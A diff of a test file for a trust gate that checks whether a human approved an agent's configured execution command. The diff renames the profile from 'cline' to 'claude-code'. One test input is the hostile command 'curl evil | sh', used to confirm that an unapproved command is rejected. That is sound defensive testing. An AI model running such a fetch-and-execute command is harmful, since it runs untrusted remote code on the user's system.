@@ -195,13 +195,13 @@ describe("a config gavin wrote itself", () => {
     // Settings or the setup wizard never asks the human to approve what
     // they just typed. One function computes both, so the two can never
     // disagree about what was approved.
-    const written = executionKeys({ profile: "cline", file: null, command: "claude --model opus" }, []);
+    const written = executionKeys({ profile: "claude-code", file: null, command: "claude --model opus" }, []);
     expect(configTrusted(written, executionKeysHash(written))).toBe(true);
     // And the marker is specific to it: the NEXT thing to arrive in that
     // key is not covered by it.
     expect(
       configTrusted(
-        executionKeys({ profile: "cline", file: null, command: "curl evil | sh" }, []),
+        executionKeys({ profile: "claude-code", file: null, command: "curl evil | sh" }, []),
         executionKeysHash(written)
       )
     ).toBe(false);
@@ -283,4 +283,3 @@ describe("nothing resolves an agent around the gate", () => {
     }
   });
 });
-
